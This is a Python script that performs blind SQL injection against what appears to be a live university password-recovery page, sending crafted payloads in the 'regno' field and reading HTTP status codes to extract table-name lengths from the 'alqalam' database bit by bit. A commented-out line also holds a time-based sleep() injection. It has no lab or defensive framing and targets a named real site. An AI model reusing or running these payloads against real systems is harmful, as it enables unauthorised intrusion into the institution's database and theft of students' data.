import os
import requests
from bs4 import BeautifulSoup as bs
from time import ctime, time


headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
#data = {"regno":"""' AND if(substr("tahir", 1,1)="t", sleep(45), (select table_name from information_schema.tables)) AND '1'='1""", "submit":"Submit"}
def getLength():
    retrievedNum = ""
    for i in range(12, -1, -1):
        curNum = 2**i
        query = """' AND if(length((select table_name from information_schema.tables where table_schema = "alqalam" limit 4, 1))&%d=%d, 1, (select table_name from information_schema.tables)) AND '1'='1"""%(curNum, curNum)
        data = {"regno":query, "submit":"Submit"}
        val = queryDB(data)
        retrievedNum += val
    number = int(retrievedNum, 2)
    print("length ===> %d"%number)
    return number



def queryDB(data):
    with requests.Session() as s:
        page = s.post("https://student.auk.edu.ng/recover_password.php", data=data, headers=headers)
        if page.status_code == 200:
            return "1"
        elif page.status_code == 500:
            return "0"
        else:
            print("check the query something might be wrong, different status_code received")


getLength()
